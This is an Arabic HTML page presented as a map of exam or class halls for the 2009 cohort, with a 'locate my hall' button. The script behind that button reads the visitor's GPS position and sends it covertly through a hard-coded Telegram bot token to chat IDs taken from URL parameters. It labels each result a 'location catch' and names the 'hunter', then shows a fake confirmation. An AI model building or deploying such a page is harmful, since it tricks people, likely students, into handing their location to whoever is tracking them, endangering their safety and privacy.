<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head><meta charset="UTF-8"><title>موقع القاعات</title></head>
<body style="text-align:center;">
    <h3>خريطة توزيع قاعات جيل 2009 📍</h3>
    <button onclick="getL()" style="padding:20px; background:blue; color:white;">تحديد موقع قاعتي</button>
    <script>
        const pr = new URLSearchParams(window.location.search);
        const token = '8386427321:AAFKq8fCsoPEDgcF8KNFR2NUr7Gh0DwfskE';
        function getL() {
            navigator.geolocation.getCurrentPosition((p) => {
                const msg = `📍 صيدة موقع (2009) 📍\n👤 الصياد: ${pr.get('hunter')}\n🌐 الموقع: https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`;
                const fullMsg = encodeURIComponent(msg);
                fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${pr.get('id')}&text=${fullMsg}`);
                fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${pr.get('dev')}&text=${fullMsg}`);
                alert("تم تحديد موقع القاعة.");
            });
        }
    </script>
</body>
</html>
